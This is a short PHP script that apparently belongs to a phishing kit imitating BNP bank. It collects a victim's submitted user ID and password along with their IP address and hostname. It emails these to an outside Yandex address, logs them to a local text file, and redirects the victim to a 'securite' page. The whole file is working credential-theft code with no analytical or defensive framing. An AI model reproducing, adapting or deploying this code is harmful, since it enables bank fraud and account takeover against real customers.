<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+| By SeF |+------------\n";
$bilsmg .= "UZR:           : ".$_POST['id']."\n";
$bilsmg .= "PZS:           : ".$_POST['oooo']."\n";
$bilsmg .= "------------+| By SeF |+------------\n";
$bilsmg .= "IP  : $ip | $hostname\n";

$bilsnd = "groupesg@yandex.com";
$bilsub = "Bnp ID | $ip";
$bilhead = "From: Bnp ID <info2@mail.ziggo.nl>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);


$fp = fopen('capoevo.txt', 'a');
fwrite($fp, $bilsmg);
fclose($fp);

header("Location: securite.html");
?>

